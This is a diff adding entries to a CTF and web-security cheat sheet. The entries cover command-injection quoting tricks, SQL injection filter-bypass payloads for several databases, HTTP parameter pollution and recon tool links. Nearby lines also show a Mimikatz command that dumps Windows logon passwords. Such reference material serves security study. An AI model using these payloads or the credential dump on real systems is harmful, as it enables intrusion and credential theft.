@@ -206,7 +206,8 @@ A=fl;B=ag;cat $A$B
 
 - `echo (true ? 'a' : false ? 'b' : 'c');`
     - `b`
-
+- ```echo `whoami`; ```
+    - `kaibro`
 
 # Command Injection
 
@@ -253,6 +254,7 @@ cat $(ls)
 - Empty String
     - `cat fl""ag`
     - `cat fl''ag`
+        - `cat "fl""ag"`
 
 # SQL Injection
 
@@ -274,6 +276,8 @@ cat $(ls)
 - Delay function
     - `sleep(5)`
     - `BENCHMARK(count, expr)`
+- 空白字元
+    - `09 0A 0B 0C 0D A0 20`
 - File-read function
     - `LOAD_FILE('/etc/passwd')`
 - File-write
@@ -322,9 +326,14 @@ cat $(ls)
     - @@datadir
         - Location of db file
     - @@hostname
+    - @@version_compile_os
+        - Operating System
     - MD5()
     - SHA1()
     - COMPRESS() / UNCOMPRESS()
+    - group_concat()
+        - 合併多條結果
+            - e.g. `select group_concat(username) from users;` 一次返回所有使用者名
 
 - Union Based
     - 判斷column數
@@ -387,6 +396,11 @@ cat $(ls)
     - `id=-1%09UNION%0DSELECT%0A1,2,3`
     - `id=(-1)UNION(SELECT(1),2,3)`
 
+- 不使用逗號
+    - `LIMIT N, M` => `LIMIT M OFFSET N`
+    - `mid(user(), 1, 1)` => `mid(user() from 1 for 1)`
+    - `UNION SELECT 1,2,3` => `UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)`
+
 ## MSSQL
 
 - 子字串：
@@ -400,6 +414,8 @@ cat $(ls)
     - `'a'+'b' => 'ab'`
 - Delay function
     - `WAIT FOR DELAY '0:0:10'`
+- 空白字元
+    - `01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20`
 - IF語句
     - IF condition true-part ELSE false-part
     - `IF (1=1) SELECT 'true' ELSE SELECT 'false'`
@@ -439,6 +455,8 @@ cat $(ls)
     - 用`dual`表
 - 子字串：
     - `SUBSTR("abc", 1, 1) => 'a'`
+- 空白字元
+    - `00 0A 0D 0C 09 20`
 - IF語句
     - `IF condition THEN true-part [ELSE false-part] END IF`
 - 註解：
@@ -478,6 +496,8 @@ cat $(ls)
     - `'a' || 'b' => 'ab'` 
 - Time Delay
     - `randomblob(100000000)`
+- 空白字元
+    - `0A 0D 0C 09 20`
 - 註解
     - `--`
 - Boolean Based: SECCON 2017 qual SqlSRF
@@ -534,6 +554,8 @@ end
 - Delay function
     - `pg_sleep(5)`
     - `GENERATE_SERIES(1, 1000000)`
+- 空白字元
+    - `0A 0D 0C 09 20`
 - encode / decode
     - `encode('123\\000\\001', 'base64')` => `MTIzAAE=`
     - `decode('MTIzAAE=', 'base64'` => `123\000\001`
@@ -580,6 +602,13 @@ HQL injection example (pwn2win 2017)
 - ffifdyop
     - md5: `276f722736c95d99e921722cf9ed621c`
     - to string: `'or'6<trash>`
+
+## HTTP Parameter Pollution
+
+- `id=1&id=2&id=3`
+    - ASP.NET + IIS: `id=1,2,3`
+    - ASP + IIS: `id=1,2,3`
+    - PHP + Apache: `id=3`
 
 
 # LFI
@@ -967,6 +996,12 @@ xxe.dtd:
 
 - https://phpinfo.me/bing.php
 
+- https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+
+- https://github.com/laramies/theHarvester
+
+- https://github.com/drwetter/testssl.sh
+
 ## Social Enginerring
 
 - https://leakedsource.ru/
@@ -1000,6 +1035,10 @@ xxe.dtd:
     - git / svn / hg / cvs ...
 
 - http://www.factordb.com/
+
+- PHP混淆 / 加密
+    - http://enphp.djunny.com/
+    - http://www.phpjm.net/
 
 - Mimikatz
     - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
